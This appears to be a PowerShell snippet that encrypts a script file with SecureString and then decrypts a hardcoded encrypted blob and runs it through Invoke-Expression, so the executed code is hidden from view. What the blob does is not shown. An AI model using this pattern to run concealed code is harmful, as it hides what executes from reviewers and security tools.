$Code = Get-Content C:\Scripts\MyCode.txt
$CodeSecureString = ConvertTo-SecureString $Code -AsPlainText -Force
$Encrypted = ConvertFrom-SecureString -SecureString $CodeSecureString
$Encrypted | Out-File -FilePath C:\Scripts\Encrypted.txt



$Instructions = "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005acac12aa02d05439b51cec88c15f8ed00000000020000000000106600000001000020000000df27935cb01adc23f2db341c5c21f7b144669678a04cd4c5afd6a689c7f08d63000000000e80000000020000200000000bfdbff6ab9d2cf8f6a9a5a5e807f7dcbebc7083012ed3f07b7ce7f6d7e9233a4000000046c27b1d891002f89a8be44eeb8878ca477eb78bc6738649df19a7535ea74ad0b809db0e543acb33d441f3714ea248b62c050ebf8dd0642b9686acd8d60eebbd40000000630dd2c88ca48e14fc130c08aef6c81284ff7d3e54cd52890b44d21c98e2e3fd1499853cf574771b0826693eddfc987696a977b8de20e3929b2bc87205b6fac2"
$Decrypt = $Instructions | ConvertTo-SecureString
$Code = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($Decrypt))
Invoke-Expression $Code
